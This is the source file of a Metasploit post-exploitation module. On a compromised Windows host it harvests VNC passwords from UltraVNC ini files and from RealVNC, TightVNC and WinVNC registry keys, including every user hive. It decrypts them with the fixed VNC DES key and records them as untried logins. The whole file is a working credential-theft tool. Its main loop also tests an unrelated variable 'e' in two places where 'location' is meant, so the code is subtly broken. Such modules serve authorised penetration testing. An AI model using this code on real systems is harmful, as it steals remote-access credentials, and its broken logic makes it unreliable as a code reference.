##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather VNC Password Extraction',
        'Description' => %q{
          This module extract DES encrypted passwords in known VNC locations
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Kurt Grutzmacher <grutz[at]jingojango.net>',
          'mubix'
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_channel_eof
              core_channel_open
              core_channel_read
              core_channel_write
              stdapi_fs_stat
              stdapi_registry_open_key
              stdapi_sys_config_getenv
            ]
          }
        }
      )
    )
  end

  def decrypt_hash(hash)
    return if hash.nil?

    # fixed des key
    # 5A B2 CD C0 BA DC AF 13
    fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
    pass = Rex::Proto::RFB::Cipher.decrypt [hash.to_s].pack('H*'), fixedkey
    pass.gsub(/\0/, '')
  end

  # Pull encrypted passwords from file based storage
  def file_get(filename, splitvar)
    client.fs.file.stat(filename)
    config = client.fs.file.new(filename, 'r')
    parse = config.read.split
    value = parse.at(parse.index { |x| x =~ /#{splitvar}/ }).split(splitvar)[1]
    return value
  rescue StandardError
    return nil
  end

  # Pull encrypted passwords from registry based storage
  def reg_get(key, variable)
    root_key, base_key = session.sys.registry.splitkey(key)
    open_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)

    data = open_key.query_value(variable).data
    if data.is_a?(Integer)
      return data
    end

    value = data.unpack('H*')[0].to_s
    return value
  rescue StandardError
    # Registry value not found
    return nil
  end

  def run
    locations = []

    # checks program files
    progfiles_env = session.sys.config.getenvs('ProgramFiles', 'ProgramFiles(x86)')
    progfiles_env.each_value do |v|
      next if v.blank?

      locations << {
        name: 'UltraVNC',
        check_file: "#{v}\\UltraVNC\\ultravnc.ini",
        pass_variable: 'passwd=',
        viewonly_variable: 'passwd2=',
        port_variable: 'PortNumber='
      }
    end

    # check uninstall key
    begin
      root_key, base_key = session.sys.registry.splitkey('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Ultravnc2_is1')
      open_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)
      vnclocation = open_key.query_value('InstallLocation').data
      locations << {
        name: 'UltraVNC',
        check_file: vnclocation + '\\ultravnc.ini',
        pass_variable: 'passwd=',
        viewonly_variable: 'passwd2=',
        port_variable: 'PortNumber='
      }
    rescue Rex::Post::Meterpreter::RequestError => e
      vprint_error(e.message)
    end

    locations << {
      name: 'WinVNC3_HKLM',
      check_reg: 'HKLM\\Software\\ORL\\WinVNC3',
      pass_variable: 'Password',
      port_variable: 'PortNumber'
    }

    locations << {
      name: 'WinVNC3_HKCU',
      check_reg: 'HKCU\\Software\\ORL\\WinVNC3',
      pass_variable: 'Password',
      port_variable: 'PortNumber'
    }

    locations << {
      name: 'WinVNC3_HKLM_Default',
      check_reg: 'HKLM\\Software\\ORL\\WinVNC3\\Default',
      pass_variable: 'Password',
      port_variable: 'PortNumber'
    }

    locations << {
      name: 'WinVNC3_HKCU_Default',
      check_reg: 'HKCU\\Software\\ORL\\WinVNC3\\Default',
      pass_variable: 'Password',
      port_variable: 'PortNumber'
    }

    locations << {
      name: 'WinVNC_HKLM_Default',
      check_reg: 'HKLM\\Software\\ORL\\WinVNC\\Default',
      pass_variable: 'Password',
      port_variable: 'PortNumber'
    }

    locations << {
      name: 'WinVNC_HKCU_Default',
      check_reg: 'HKCU\\Software\\ORL\\WinVNC\\Default',
      pass_variable: 'Password',
      port_variable: 'PortNumber'
    }

    locations << {
      name: 'WinVNC4_HKLM',
      check_reg: 'HKLM\\Software\\RealVNC\\WinVNC4',
      pass_variable: 'Password',
      port_variable: 'PortNumber'
    }

    locations << {
      name: 'WinVNC4_HKCU',
      check_reg: 'HKCU\\Software\\RealVNC\\WinVNC4',
      pass_variable: 'Password',
      port_variable: 'PortNumber'
    }

    locations << {
      name: 'RealVNC_HKLM',
      check_reg: 'HKLM\\Software\\RealVNC\\Default',
      pass_variable: 'Password',
      port_variable: 'PortNumber'
    }

    locations << {
      name: 'RealVNC_HKCU',
      check_reg: 'HKCU\\Software\\RealVNC\\Default',
      pass_variable: 'Password',
      port_variable: 'PortNumber'
    }

    locations << {
      name: 'TightVNC_HKLM',
      check_reg: 'HKLM\\Software\\TightVNC\\Server',
      pass_variable: 'Password',
      port_variable: 'RfbPort'
    }

    locations << {
      name: 'TightVNC_HKLM_Control_pass',
      check_reg: 'HKLM\\Software\\TightVNC\\Server',
      pass_variable: 'ControlPassword',
      port_variable: 'RfbPort'
    }

    userhives = load_missing_hives
    userhives.each do |hive|
      next if hive['HKU'].nil?

      locations << {
        name: "RealVNC_#{hive['SID']}",
        check_reg: "#{hive['HKU']}\\Software\\RealVNC\\Default",
        pass_variable: 'Password',
        port_variable: 'PortNumber'
      }

      locations << {
        name: "WinVNC4_#{hive['SID']}",
        check_reg: "#{hive['HKU']}\\Software\\RealVNC\\WinVNC4",
        pass_variable: 'Password',
        port_variable: 'PortNumber'
      }

      locations << {
        name: "WinVNC_#{hive['SID']}_Default",
        check_reg: "#{hive['HKU']}\\Software\\ORL\\WinVNC\\Default",
        pass_variable: 'Password',
        port_variable: 'PortNumber'
      }

      locations << {
        name: "WinVNC3_#{hive['SID']}_Default",
        check_reg: "#{hive['HKU']}\\Software\\ORL\\WinVNC3\\Default",
        pass_variable: 'Password',
        port_variable: 'PortNumber'
      }

      locations << {
        name: "WinVNC3_#{hive['SID']}",
        check_reg: "#{hive['HKU']}\\Software\\ORL\\WinVNC3",
        pass_variable: 'Password',
        port_variable: 'PortNumber'
      }
    end

    print_status("Enumerating VNC passwords on #{sysinfo['Computer']}")

    locations.map do |location|
      vprint_status("Checking #{location[:name]}...")

      if e.key?(:check_reg)
        location[:port] = reg_get(location[:check_reg], location[:port_variable])
        location[:hash] = reg_get(location[:check_reg], location[:pass_variable])
        location[:pass] = decrypt_hash(location[:hash])
        if location.key?(:viewonly_variable)
          location[:viewonly_hash] = reg_get(location[:check_reg], location[:viewonly_variable])
          location[:viewonly_pass] = decrypt_hash(location[:viewonly_hash])
        end
      elsif location.key?(:check_file)
        location[:port] = file_get(location[:check_file], location[:port_variable])
        location[:hash] = file_get(location[:check_file], location[:pass_variable])
        location[:pass] = decrypt_hash(location[:hash])
        if location.key?(:viewonly_variable)
          location[:viewonly_hash] = file_get(location[:check_file], location[:viewonly_variable])
          location[:viewonly_pass] = decrypt_hash(location[:viewonly_hash])
        end
      end

      next if location[:pass].nil? && location[:viewonly_pass].nil?

      location[:port] = 5900 if location[:port].nil?

      # reporting
      service_data = {
        address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
        port: location[:port],
        service_name: 'vnc',
        protocol: 'tcp',
        workspace_id: myworkspace_id,
        origin_type: :session,
        session_id: session_db_id,
        post_reference_name: refname
      }

      if !e[:pass].nil?
        print_good("Location: #{location[:name]} => Hash: #{location[:hash]} => Password: #{location[:pass]} => Port: #{location[:port]}")

        # Assemble data about the credential objects we will be creating
        credential_data = {
          private_type: :password,
          private_data: location[:pass].to_s
        }

        # Merge the service data into the credential data
        credential_data.merge!(service_data)

        # Create the Metasploit::Credential::Core object
        credential_core = create_credential(credential_data)

        # Assemble the options hash for creating the Metasploit::Credential::Login object
        login_data = {
          access_level: 'interactive',
          core: credential_core,
          status: Metasploit::Model::Login::Status::UNTRIED
        }

        # Merge in the service data and create our Login
        login_data.merge!(service_data)
        create_credential_login(login_data)
      end

      next if location[:viewonly_pass].nil?

      print_good("VIEW ONLY: #{location[:name]} => #{location[:viewonly_hash]} => #{location[:viewonly_pass]} on port: #{location[:port]}")

      # Assemble data about the credential objects we will be creating
      credential_data = {
        private_type: :password,
        private_data: location[:viewonly_pass].to_s
      }

      # Merge the service data into the credential data
      credential_data.merge!(service_data)

      # Create the Metasploit::Credential::Core object
      credential_core = create_credential(credential_data)

      # Assemble the options hash for creating the Metasploit::Credential::Login object
      login_data = {
        access_level: 'view_only',
        core: credential_core,
        status: Metasploit::Model::Login::Status::UNTRIED
      }

      # Merge in the service data and create our Login
      login_data.merge!(service_data)
      create_credential_login(login_data)
    end

    unload_our_hives(userhives)
  end
end
